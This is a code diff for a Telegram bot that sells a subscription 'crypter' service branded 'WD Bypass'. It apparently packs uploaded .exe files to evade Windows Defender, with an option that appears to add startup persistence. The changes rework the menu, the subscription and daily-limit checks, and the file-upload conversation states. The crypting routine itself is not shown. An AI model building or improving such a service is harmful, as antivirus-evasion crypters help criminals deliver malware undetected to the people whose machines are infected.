@@ -240,13 +240,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await edit_message(query, text, reply)
 
     elif data == "crypter":
-        if has_active_subscription(query.from_user.id):
-            text = "✅ Subscription active (WD Bypass).\n\nPlease upload your .exe file to encrypt it."
-        else:
-            text = "❌ You do not have an active subscription.\n\nPlease contact the admin to purchase one."
-
-        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
+        keyboard = [
+            [InlineKeyboardButton("WD Bypass", callback_data="wd_bypass")],
+            [InlineKeyboardButton("Back", callback_data="back")]
+        ]
         reply = InlineKeyboardMarkup(keyboard)
+        text = "Please select a crypting method:"
         await edit_message(query, text, reply)
 
     elif data == "back":
@@ -300,13 +299,36 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # Conversation states
-GET_FILENAME, GET_STARTUP_CHOICE = range(2)
+AWAIT_FILE, GET_FILENAME, GET_STARTUP_CHOICE = range(3)
+
+async def wd_bypass_entry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Entry point for the crypter conversation, triggered by a button."""
+    query = update.callback_query
+    await query.answer()
+
+    uid = query.from_user.id
+
+    if not has_active_subscription(uid):
+        await edit_message(query, "❌ You do not have an active subscription to use this method.", InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="crypter")]]))
+        return ConversationHandler.END
+
+    if not can_user_crypt(uid):
+        u_data = load_json(USERS_FILE).get(str(uid), {})
+        limit = u_data.get('daily_limit', 1)
+        await edit_message(query, f"You have already used your {limit} daily crypt(s). Please try again tomorrow.", None)
+        return ConversationHandler.END
+
+    await edit_message(query, "✅ Subscription active.\n\nPlease upload your .exe file to encrypt it, or type /cancel to go back.", None)
+
+    return AWAIT_FILE
+
 
 async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the initial file upload and starts the conversation."""
+    """Handles the file upload state."""
     msg = update.message
     if msg is None or msg.document is None:
-        return ConversationHandler.END
+        await update.message.reply_text("Invalid file. Please send a document or type /cancel.")
+        return AWAIT_FILE
 
     doc = msg.document
     user = update.effective_user
@@ -314,7 +336,7 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return ConversationHandler.END
     uid = user.id
 
-    # Check the daily limit before proceeding
+    # Daily limit is already checked at entry, but as a safeguard for long-running conversations:
     if not can_user_crypt(uid):
         u_data = load_json(USERS_FILE).get(str(uid), {})
         limit = u_data.get('daily_limit', 1)
@@ -601,17 +623,23 @@ def main():
     job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
 
     conv_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
+        entry_points=[CallbackQueryHandler(wd_bypass_entry, pattern="^wd_bypass$")],
         states={
+            AWAIT_FILE: [MessageHandler(filters.Document.ALL, file_upload_handler)],
             GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
-            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
+            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice, pattern="^startup_(yes|no)$")],
         },
-        fallbacks=[CommandHandler("cancel", cancel)],
+        fallbacks=[
+            CommandHandler("cancel", cancel),
+            # Also handle the back buttons as a way to cancel/go back.
+            CallbackQueryHandler(callback_handler, pattern="^back$"),
+            CallbackQueryHandler(callback_handler, pattern="^crypter$")
+        ],
     )
 
     app.add_handler(conv_handler)
     app.add_handler(CommandHandler("start", start))
-    # Note: The main callback_handler for the menu buttons is still needed for profile, plans, etc.
+    # The main callback_handler now handles all non-conversation buttons.
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(CommandHandler("grant_a", grant_a_cmd))
     app.add_handler(CommandHandler("set_daily", set_daily_cmd))
